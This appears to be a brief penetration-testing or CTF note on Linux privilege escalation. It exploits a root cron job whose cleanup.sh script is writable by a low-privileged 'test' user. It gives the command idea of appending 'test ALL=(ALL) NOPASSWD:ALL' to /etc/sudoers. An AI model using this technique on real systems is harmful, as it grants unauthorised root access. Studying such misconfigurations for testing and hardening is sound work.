# Writable script in /etc/crontab

```
cat /etc/crontab
```

Every 5 min, the cleanup.sh script execute by root.

And we have enough permission to write that file.

We are test user. So we can add root privileges to this account.

```
echo "echo \"test ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"
```
